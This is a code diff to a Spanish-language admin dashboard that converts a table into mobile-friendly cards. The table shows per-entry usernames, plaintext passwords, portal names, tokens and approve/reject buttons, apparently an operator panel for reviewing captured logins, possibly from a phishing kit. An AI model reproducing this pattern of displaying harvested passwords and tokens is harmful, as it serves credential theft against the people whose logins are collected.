@@ -261,34 +261,68 @@
             .stat-card { padding: 14px 18px; }
             .stat-info h3 { font-size: 22px; }
             
-            /* Tabla responsive con scroll horizontal */
+            /* Tabla responsive - convertir a cards */
             .table-container { 
-                overflow-x: auto; 
-                -webkit-overflow-scrolling: touch;
+                overflow: visible;
                 border-radius: 8px;
+                background: transparent;
+                box-shadow: none;
             }
-            table { min-width: 900px; }
-            thead th { 
-                padding: 10px 12px; 
-                font-size: 11px; 
-                white-space: nowrap;
+            table, thead, tbody, tr, th, td {
+                display: block;
             }
-            tbody td { 
-                padding: 10px 12px; 
-                font-size: 13px; 
+            thead {
+                display: none;
             }
-            .actions-cell { 
-                flex-direction: column; 
-                gap: 4px;
+            tbody tr {
+                background: white;
+                border-radius: 12px;
+                box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+                margin-bottom: 12px;
+                padding: 16px;
+                display: flex;
+                flex-direction: column;
+                gap: 10px;
             }
-            .btn { 
-                padding: 6px 10px; 
-                font-size: 11px; 
+            tbody td {
+                padding: 0;
+                border: none;
+                font-size: 14px;
+                display: flex;
+                align-items: center;
+                gap: 8px;
+            }
+            tbody td::before {
+                content: attr(data-label);
+                font-weight: 600;
+                color: #6b7280;
+                font-size: 12px;
+                text-transform: uppercase;
+                letter-spacing: 0.5px;
+                min-width: 90px;
+                flex-shrink: 0;
+            }
+            .user-cell {
+                width: 100%;
+            }
+            .user-avatar { width: 32px; height: 32px; font-size: 12px; }
+            .password-cell { font-size: 13px; }
+            .actions-cell {
+                flex-direction: row;
+                flex-wrap: wrap;
+                gap: 6px;
+                width: 100%;
+            }
+            .btn {
+                padding: 8px 14px;
+                font-size: 12px;
+                flex: 1;
                 justify-content: center;
+                min-width: 0;
             }
-            .btn i { font-size: 12px; }
-            .user-avatar { width: 28px; height: 28px; font-size: 11px; }
-            .password-cell { font-size: 11px; }
+            .btn i { font-size: 13px; }
+            .last-update { display: block; margin-left: 0; margin-top: 4px; }
+            .section-title { flex-wrap: wrap; }
         }
 
         @media (max-width: 480px) {
@@ -303,6 +337,10 @@
             .section-title { font-size: 15px; }
             .btn-clear { padding: 8px 14px; font-size: 12px; }
             .footer { font-size: 11px; padding: 16px; }
+            tbody tr { padding: 12px; gap: 8px; }
+            tbody td { font-size: 13px; }
+            tbody td::before { min-width: 75px; font-size: 11px; }
+            .btn { padding: 6px 10px; font-size: 11px; }
         }
     </style>
 </head>
@@ -579,7 +617,7 @@
                 }
 
                 html += '<tr>' +
-                    '<td>' +
+                    '<td data-label="Usuario">' +
                         '<div class="user-cell">' +
                             '<div class="user-avatar ' + avatarColor + '">' + initials + '</div>' +
                             '<div class="user-info">' +
@@ -588,12 +626,12 @@
                             '</div>' +
                         '</div>' +
                     '</td>' +
-                    '<td><span class="password-cell">' + escapeHtml(s.contrasena || '') + '</span></td>' +
-                    '<td><span class="portal-badge ' + s.portal + '"><i class="fas ' + portalIcon + '"></i> ' + portalLabel + '</span></td>' +
-                    '<td>' + statusBadge + '</td>' +
-                    '<td>' + tokenHtml + '</td>' +
-                    '<td style="font-size: 12px; color: #6b7280;">' + fecha + '</td>' +
-                    '<td>' +
+                    '<td data-label="Contraseña"><span class="password-cell">' + escapeHtml(s.contrasena || '') + '</span></td>' +
+                    '<td data-label="Portal"><span class="portal-badge ' + s.portal + '"><i class="fas ' + portalIcon + '"></i> ' + portalLabel + '</span></td>' +
+                    '<td data-label="Estado">' + statusBadge + '</td>' +
+                    '<td data-label="Token">' + tokenHtml + '</td>' +
+                    '<td data-label="Fecha" style="font-size: 12px; color: #6b7280;">' + fecha + '</td>' +
+                    '<td data-label="Acciones">' +
                         '<div class="actions-cell">' +
                             '<button class="btn btn-approve" onclick="actualizarEstadoClick(' + id + ', \'aprobado\')" ' + (s.estado === 'aprobado' ? 'disabled style="opacity:0.5;cursor:not-allowed;"' : '') + '><i class="fas fa-check"></i> Aprobar</button>' +
                             '<button class="btn btn-reject" onclick="actualizarEstadoClick(' + id + ', \'rechazado\')" ' + (s.estado === 'rechazado' ? 'disabled style="opacity:0.5;cursor:not-allowed;"' : '') + '><i class="fas fa-times"></i> Rechazar</button>' +
